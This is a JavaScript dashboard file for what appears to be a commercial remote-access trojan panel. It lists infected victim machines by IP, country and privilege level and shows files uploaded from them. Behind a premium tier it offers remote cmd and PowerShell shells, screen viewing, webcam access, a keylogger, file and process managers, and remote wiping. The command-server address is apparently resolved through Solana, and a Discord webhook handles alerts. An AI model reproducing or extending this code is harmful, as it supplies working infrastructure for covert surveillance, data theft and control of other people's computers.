// language: JavaScript, file: public/js/dashboard.js
const $ = (id) => document.getElementById(id);

let me = null;
const HOST_PAGE_SIZE = 50;
const REMOTE_PAGE_SIZE = 50;
const state = {
  hosts:  { offset: 0, q: '', status: 'all' },
  remote: { offset: 0, q: '' },
};
let pollTimer = null;
let pollIntervalMs = 3000;

async function loadMe() {
  const r = await fetch('/api/me');
  if (r.status === 401) { location.href = '/signin.html'; return; }
  me = await r.json();
  $('who').textContent = me.username;
  $('ov-akey').textContent = me.accountKey;
  $('ov-since').textContent = new Date(me.createdAt).toLocaleDateString();
  $('ov-wh').textContent = me.discordWebhook ? 'connected' : '—';
  $('whurl').value = me.discordWebhook || '';
  $('a-user').textContent = me.username;
  $('a-mail').textContent = me.email;
  $('a-akey').textContent = me.accountKey;
  revealSetup('a-ltok', me.loginToken);

  const remoteTab = document.querySelector('.nav a[data-tab="remote"]');
  if (remoteTab && !me.isPremium) {
    remoteTab.classList.add('locked');
    remoteTab.title = 'premium';
    remoteTab.style.opacity = '0.4';
    remoteTab.style.cursor = 'not-allowed';

    const badge = document.createElement('span');
    badge.textContent = 'PREMIUM';
    badge.style.cssText =
      'font-size:9px;padding:1px 6px;border-radius:4px;' +
      'background:rgba(251,191,36,.18);color:#fbbf24;' +
      'margin-left:auto;font-weight:700;letter-spacing:.06em;';
    remoteTab.appendChild(badge);

    remoteTab.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopImmediatePropagation();
      alert('you need premium');
    }, true);
  }
}

function revealSetup(id, value) {
  const el = $(id);
  if (!el) return;
  el.dataset.real = value || '';
  el.dataset.shown = '0';
  el.textContent = '•'.repeat((value || '').length);
}

document.addEventListener('click', (e) => {
  const b = e.target.closest('[data-reveal]');
  if (!b) return;
  const el = $(b.dataset.reveal);
  if (!el) return;
  const shown = el.dataset.shown === '1';
  if (shown) {
    el.textContent = '•'.repeat(el.dataset.real.length);
    el.dataset.shown = '0';
    b.textContent = 'reveal';
  } else {
    el.textContent = el.dataset.real;
    el.dataset.shown = '1';
    b.textContent = 'hide';
  }
});

document.querySelectorAll('.nav a').forEach((a) => {
  a.addEventListener('click', () => {
    if (a.classList.contains('locked')) return;
    document.querySelectorAll('.nav a').forEach((x) => x.classList.remove('active'));
    document.querySelectorAll('.section').forEach((x) => x.classList.remove('active'));
    a.classList.add('active');
    $(a.dataset.tab).classList.add('active');
    const tab = a.dataset.tab;
    if (tab === 'overview') { pollIntervalMs = 3000; loadOverview(); startPolling(); }
    else if (tab === 'hosts') { pollIntervalMs = 5000; loadHosts(); startPolling(); }
    else if (tab === 'remote') { pollIntervalMs = 8000; loadRemote(); startPolling(); }
    else if (tab === 'builder') { stopPolling(); window.__builderResumeMc?.(); }
    else stopPolling();
  });
});

function stopPolling() { if (pollTimer) { clearInterval(pollTimer); pollTimer = null; } }
function startPolling() {
  stopPolling();
  pollTimer = setInterval(() => {
    const active = document.querySelector('.nav a.active')?.dataset.tab;
    if (active === 'overview') loadOverview();
    else if (active === 'hosts') loadHosts();
    else if (active === 'remote') loadRemote();
  }, pollIntervalMs);
}

async function loadOverview() {
  const r = await fetch('/api/clients?limit=1&offset=0');
  if (!r.ok) return;
  const d = await r.json();
  $('ov-online').textContent = d.online;
  $('ov-offline').textContent = d.offline;
  $('ov-total').textContent = d.total;
}

function fmtAgo(ts) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return `${s}s ago`;
  if (s < 3600) return `${Math.floor(s / 60)}m ago`;
  if (s < 86400) return `${Math.floor(s / 3600)}h ago`;
  return `${Math.floor(s / 86400)}d ago`;
}

function fmtPing(ms) {
  if (ms === null || ms === undefined) return '—';
  return `${ms} ms`;
}

function esc(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;',
  }[c]));
}

function humanSize(n) {
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / 1024 / 1024).toFixed(2)} MB`;
}

function countryCell(c) {
  if (!c || !c.name) return `<span class="country"><span class="country-empty">—</span></span>`;
  const flag = c.flag ? `<span class="country-flag">${esc(c.flag)}</span>` : '';
  return `<span class="country">${flag}<span class="country-name">${esc(c.name)}</span></span>`;
}

function privBadge(p) {
  const label = esc(p || 'admin');
  return `<span class="priv-badge">${label}</span>`;
}

async function loadHosts() {
  const s = state.hosts;
  const q = new URLSearchParams({
    status: s.status, q: s.q, limit: String(HOST_PAGE_SIZE), offset: String(s.offset),
  });
  const r = await fetch('/api/clients?' + q);
  if (!r.ok) return;
  const d = await r.json();
  $('h-count').textContent = `${d.total} total · ${d.online} online · ${d.offline} offline`;

  const host = $('h-rows');
  host.innerHTML = '';
  if (d.rows.length === 0) {
    host.innerHTML = '<div class="empty"><svg viewBox="0 0 24 24"><rect width="20" height="8" x="2" y="2" rx="2" ry="2"/><rect width="20" height="8" x="2" y="14" rx="2" ry="2"/><line x1="6" x2="6.01" y1="6" y2="6"/><line x1="6" x2="6.01" y1="18" y2="18"/></svg>no hosts</div>';
  } else {
    d.rows.forEach(c => host.appendChild(buildRow(c, () => openHostDetail(c))));
  }

  const page = Math.floor(s.offset / HOST_PAGE_SIZE) + 1;
  const pages = Math.max(1, Math.ceil(d.total / HOST_PAGE_SIZE));
  $('h-page').textContent = `page ${page} / ${pages}`;
  $('h-prev').disabled = s.offset === 0;
  $('h-next').disabled = s.offset + HOST_PAGE_SIZE >= d.total;
}

function buildRow(c, onOpen) {
  const el = document.createElement('div');
  el.className = 'row';
  el.innerHTML = `
    <span class="dot ${c.online ? 'on' : 'off'}"></span>
    <span class="host">${esc(c.hostname)}</span>
    <span class="ip">${esc(c.ip)}</span>
    ${countryCell(c.country)}
    <span class="seen">${fmtAgo(c.lastSeen)}</span>
    <span class="actions"><button class="ghost mini" data-open>view</button></span>`;
  el.addEventListener('click', (e) => {
    if (!e.target.closest('button') || e.target.closest('[data-open]')) onOpen();
  });
  return el;
}

async function openHostDetail(c) {
  $('drawer-title').textContent = c.hostname;
  const box = $('drawer-content');

  box.innerHTML = `
    <div class="detail">
      <div class="sub" style="margin:0;color:var(--muted)">${esc(c.ip)}</div>

      <div class="kv">
        <div class="k">client id</div> <div class="v">${c.id}</div>
        <div class="k">state</div>     <div class="v plain" style="color:${c.online ? 'var(--green)' : 'var(--muted)'}">${c.online ? 'online' : 'offline'}</div>
        <div class="k">ipv4</div>      <div class="v">${esc(c.ip)}</div>
        <div class="k">country</div>   <div class="v plain">${c.country ? esc(c.country.flag + ' ' + c.country.name) : '—'}</div>
        <div class="k">last seen</div> <div class="v plain">${new Date(c.lastSeen).toLocaleString()}</div>
      </div>

      <div style="display:flex;gap:8px;margin-top:24px;flex-wrap:wrap">
        <button class="ghost mini" data-files>open files</button>
        <button class="ghost mini" data-procs>processes</button>
        <button class="ghost mini" data-remote>go to remote</button>
        <button class="ghost mini" data-del style="border-color:rgba(248,113,113,.35);color:var(--red)">delete</button>
      </div>

      <h3 style="margin-top:28px;font-size:14px;border-bottom:1px solid var(--line);padding-bottom:8px;">uploads</h3>
      <div id="u-list" style="margin-top:12px;"><div class="note">loading…</div></div>
    </div>`;

  $('drawer').classList.add('open');
  $('drawer-backdrop').classList.add('open');

  box.querySelector('[data-remote]').addEventListener('click', () => {
    closeDrawer();
    document.querySelector('.nav a[data-tab="remote"]')?.click();
    state.remote.q = c.hostname;
    $('r-search').value = c.hostname;
    loadRemote();
  });
  box.querySelector('[data-files]').addEventListener('click', () => {
    openFileManager(c);
  });
  box.querySelector('[data-procs]').addEventListener('click', () => {
    openProcs(c);
  });
  box.querySelector('[data-del]').addEventListener('click', async () => {
    if (!confirm(`delete ${c.hostname}?`)) return;
    const r = await fetch(`/api/clients/${c.id}`, { method: 'DELETE' });
    if (r.ok) { closeDrawer(); loadHosts(); }
  });

  await loadUploads(c.id, box.querySelector('#u-list'));
}

async function loadUploads(clientId, container) {
  const r = await fetch(`/api/clients/${clientId}/uploads`);
  if (!r.ok) { container.innerHTML = '<div class="note">failed to load</div>'; return; }
  const rows = await r.json();
  container.innerHTML = '';
  if (rows.length === 0) {
    container.innerHTML = '<div class="note">no uploads yet.</div>';
    return;
  }
  rows.forEach(u => {
    const el = document.createElement('div');
    el.className = 'upload-row';
    el.innerHTML = `
      <div>
        <div class="name">${esc(u.filename)}</div>
        <div class="meta">${new Date(u.created_at).toLocaleString()} · ${humanSize(u.size)}</div>
      </div>
      <button class="ghost mini" data-dl>download</button>`;
    el.querySelector('[data-dl]').addEventListener('click', () => {
      location.href = `/api/uploads/${u.id}/download`;
    });
    container.appendChild(el);
  });
}

// ---------- REMOTE OPENER ----------
async function getRemoteIp() {
  try {
    const r = await fetch('/api/remote_ip');
    if (!r.ok) return null;
    const d = await r.json();
    return d.ip;
  } catch { return null; }
}

async function openConsole(c, shell) {
  const ip = await getRemoteIp();
  if (!ip) return alert('Remote server IP not found from Solana');
  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '', shell: shell || 'cmd' });
  window.open(`http://${ip}:3000/cmd.html?` + q.toString(), '_blank', 'width=1000,height=640');
}

async function openRdp(c) {
  const ip = await getRemoteIp();
  if (!ip) return alert('Remote server IP not found from Solana');
  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
  window.open(`http://${ip}:3000/rdp.html?` + q.toString(), '_blank', 'width=1200,height=760');
}

async function openWebcam(c) {
  const ip = await getRemoteIp();
  if (!ip) return alert('Remote server IP not found from Solana');
  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
  window.open(`http://${ip}:3000/webcam.html?` + q.toString(), '_blank', 'width=1000,height=700');
}

async function openKeylog(c) {
  const ip = await getRemoteIp();
  if (!ip) return alert('Remote server IP not found from Solana');
  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
  window.open(`http://${ip}:3000/keylog.html?` + q.toString(), '_blank', 'width=1000,height=700');
}

async function openProcs(c) {
  const ip = await getRemoteIp();
  if (!ip) return alert('Remote server IP not found from Solana');
  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
  window.open(`http://${ip}:3000/procs.html?` + q.toString(), '_blank', 'width=1100,height=800');
}

async function openFileManager(c) {
  const ip = await getRemoteIp();
  if (!ip) return alert('Remote server IP not found from Solana');
  const q = new URLSearchParams({ id: String(c.id), host: c.hostname || '', ip: c.ip || '' });
  window.open(`http://${ip}:3000/files.html?` + q.toString(), '_blank', 'width=1000,height=700');
  closeDrawer();
}

function closeDrawer() {
  $('drawer').classList.remove('open');
  $('drawer-backdrop').classList.remove('open');
}

$('drawer-close').addEventListener('click', closeDrawer);
$('drawer-backdrop').addEventListener('click', closeDrawer);
document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeDrawer(); });

async function loadRemote() {
  const s = state.remote;
  const q = new URLSearchParams({
    status: 'online', q: s.q, limit: String(REMOTE_PAGE_SIZE), offset: String(s.offset),
  });
  const r = await fetch('/api/clients?' + q);
  if (!r.ok) return;
  const d = await r.json();
  $('r-count').textContent = `${d.online} online`;

  const host = $('r-rows');
  host.innerHTML = '';
  if (d.rows.length === 0) {
    host.innerHTML = '<div class="empty"><svg viewBox="0 0 24 24"><path d="M18 3a3 3 0 0 0-3 3v12a3 3 0 0 0 3 3 3 3 0 0 0 3-3V6a3 3 0 0 0-3-3Z"/><path d="M6 3a3 3 0 0 0-3 3v12a3 3 0 0 0 3 3 3 3 0 0 0 3-3V6a3 3 0 0 0-3-3Z"/><path d="M10 9h4"/><path d="M10 15h4"/></svg>no online clients</div>';
  } else {
    d.rows.forEach(c => host.appendChild(buildRemoteRow(c)));
  }

  const page = Math.floor(s.offset / REMOTE_PAGE_SIZE) + 1;
  const pages = Math.max(1, Math.ceil(d.online / REMOTE_PAGE_SIZE));
  $('r-page').textContent = `page ${page} / ${pages}`;
  $('r-prev').disabled = s.offset === 0;
  $('r-next').disabled = s.offset + REMOTE_PAGE_SIZE >= d.online;
}

function buildRemoteRow(c) {
  const el = document.createElement('div');
  el.className = 'row remote-row';
  el.innerHTML = `
    <span class="dot on"></span>
    <span class="host">${esc(c.hostname)}</span>
    <span class="ip">${esc(c.ip)}</span>
    ${countryCell(c.country)}
    <span class="priv">${privBadge(c.privileges)}</span>
    <span class="ping">${fmtPing(c.ping)}</span>
    <span class="seen">${fmtAgo(c.lastSeen)}</span>
    <span class="actions" style="position:relative">
      <button class="ghost mini" data-gear title="actions" style="padding:4px 10px">
        <svg class="icon" viewBox="0 0 24 24" style="width:14px;height:14px;"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"/><circle cx="12" cy="12" r="3"/></svg>
      </button>
    </span>`;
  el.querySelector('[data-gear]').addEventListener('click', (e) => {
    e.stopPropagation();
    openGearMenu(e.currentTarget, c);
  });
  return el;
}

let gearMenuEl = null;
function closeGearMenu() { if (gearMenuEl) { gearMenuEl.remove(); gearMenuEl = null; } }
document.addEventListener('click', closeGearMenu);

function openGearMenu(anchor, c) {
  closeGearMenu();
  const rect = anchor.getBoundingClientRect();
  const menu = document.createElement('div');
  menu.className = 'gear-menu';
  menu.style.top  = `${rect.bottom + 4}px`;
  menu.style.left = `${rect.right - 240}px`;

  if (!me.isPremium) {
    menu.innerHTML = `
      <div class="title">${esc(c.hostname)}</div>
      <div class="item" style="color:var(--red); cursor:default;">Premium required</div>
      <div class="sep"></div>
      <div class="item" data-item="wipe">wipe + reinstall</div>
    `;
  } else {
    menu.innerHTML = `
      <div class="title">${esc(c.hostname)}</div>
      <div class="item" data-item="rdp">screen (rdp)</div>
      <div class="item" data-item="webcam">webcam</div>
      <div class="item" data-item="keylog">keylogger</div>
      <div class="item" data-item="files">file manager</div>
      <div class="item" data-item="procs">process manager</div>
      <div class="sep"></div>
      <div class="item" data-item="cmd">remote shell — cmd</div>
      <div class="item" data-item="ps">remote shell — powershell</div>
      <div class="sep"></div>
      <div class="item" data-item="wipe" style="color:var(--red)">wipe + reinstall</div>
    `;
  }

  menu.querySelectorAll('[data-item]').forEach((el) => {
    el.addEventListener('click', async (ev) => {
      ev.stopPropagation();
      closeGearMenu();
      const it = el.dataset.item;
      if (it === 'rdp') await openRdp(c);
      else if (it === 'webcam') await openWebcam(c);
      else if (it === 'keylog') await openKeylog(c);
      else if (it === 'cmd') await openConsole(c, 'cmd');
      else if (it === 'ps') await openConsole(c, 'powershell');
      else if (it === 'wipe') wipeClient(c);
      else if (it === 'files') await openFileManager(c);
      else if (it === 'procs') await openProcs(c);
    });
  });
  document.body.appendChild(menu);
  gearMenuEl = menu;
}

async function wipeClient(c) {
  if (!me.isPremium) return;
  const ok = confirm(`reinstall ${c.hostname}?`);
  if (!ok) return;

  const r = await fetch(`/api/clients/${c.id}/wipe`, {
    method: 'POST',
    credentials: 'same-origin',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({}),
  });
  const d = await r.json().catch(() => ({}));
  if (r.ok) {
    alert('reinstalling 10-30sec');
  } else {
    alert(`failed: ${d.error || r.status}`);
  }
}

function debounce(fn, ms) { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); }; }

$('h-search').addEventListener('input', debounce((e) => { state.hosts.q = e.target.value; state.hosts.offset = 0; loadHosts(); }, 220));
$('h-status').addEventListener('change', (e) => { state.hosts.status = e.target.value; state.hosts.offset = 0; loadHosts(); });
$('h-refresh').addEventListener('click', () => { state.hosts.offset = 0; loadHosts(); });
$('h-prev').addEventListener('click', () => { state.hosts.offset = Math.max(0, state.hosts.offset - HOST_PAGE_SIZE); loadHosts(); });
$('h-next').addEventListener('click', () => { state.hosts.offset += HOST_PAGE_SIZE; loadHosts(); });

$('r-search').addEventListener('input', debounce((e) => { state.remote.q = e.target.value; state.remote.offset = 0; loadRemote(); }, 220));
$('r-refresh').addEventListener('click', () => { state.remote.offset = 0; loadRemote(); });
$('r-prev').addEventListener('click', () => { state.remote.offset = Math.max(0, state.remote.offset - REMOTE_PAGE_SIZE); loadRemote(); });
$('r-next').addEventListener('click', () => { state.remote.offset += REMOTE_PAGE_SIZE; loadRemote(); });

$('whtest').addEventListener('click', async () => {
  $('wherr').textContent = '';
  const r = await fetch('/api/webhook/test', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url: $('whurl').value.trim() }),
  });
  const d = await r.json().catch(() => ({}));
  $('wherr').textContent = r.ok ? 'webhook live' : (d.error || 'failed');
  if (r.ok) $('ov-wh').textContent = 'connected';
});

$('logout').addEventListener('click', async () => {
  await fetch('/api/logout', { method: 'POST' });
  location.href = '/signin.html';
});

loadMe();
loadOverview();
startPolling();